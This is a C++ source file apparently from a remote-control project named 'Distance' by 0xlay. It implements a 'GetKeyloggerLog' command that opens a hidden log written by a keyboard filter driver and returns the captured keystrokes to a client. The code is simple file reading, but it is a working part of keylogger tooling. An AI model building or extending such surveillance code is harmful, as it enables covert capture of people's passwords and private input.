//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: KeyloggerCommand.hpp
// 
// Creator: 0xlay
// 
// Environment: User mode only
//
// Module: DistanceService.exe
//
//------------------------------------------------------------------------------

#include "KeyloggerCommand.hpp"
#include "DkfltCommon.hpp"
#include <stdexcept>


namespace Distance::Command
{
    GetKeyloggerLog::GetKeyloggerLog()
    {
        file_ = CreateFileW(D_KFILTER_LOG_FILE,
                            GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            nullptr,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_HIDDEN,
                            nullptr);
        if (file_ == INVALID_HANDLE_VALUE)
        {
            throw std::runtime_error(
                "The client failed to open the Dkflt log file!"
            );
        }
    }

    GetKeyloggerLog::~GetKeyloggerLog() noexcept
    {
        CloseHandle(file_);
    }

    GetKeyloggerLog& GetKeyloggerLog::execute()
    {
        LARGE_INTEGER li{};
        if (!GetFileSizeEx(file_, &li))
        {
            throw std::runtime_error(
                "The client failed to get the size of the Dkflt log file!"
            );
        }

        log_.resize(li.LowPart / sizeof(wchar_t));
        DWORD numOfBytesRead = 0;

        if (!ReadFile(file_,
                 &log_[0],
                 li.LowPart,
                 &numOfBytesRead,
                 nullptr))
        {
            throw std::runtime_error(
                "The client failed to read info from the Dkflt log file!"
            );
        }

        log_.shrink_to_fit();
        return *this;
    }

    std::wstring GetKeyloggerLog::pickUp() noexcept
    {
        return std::move(log_);
    }

} // Distance::Command
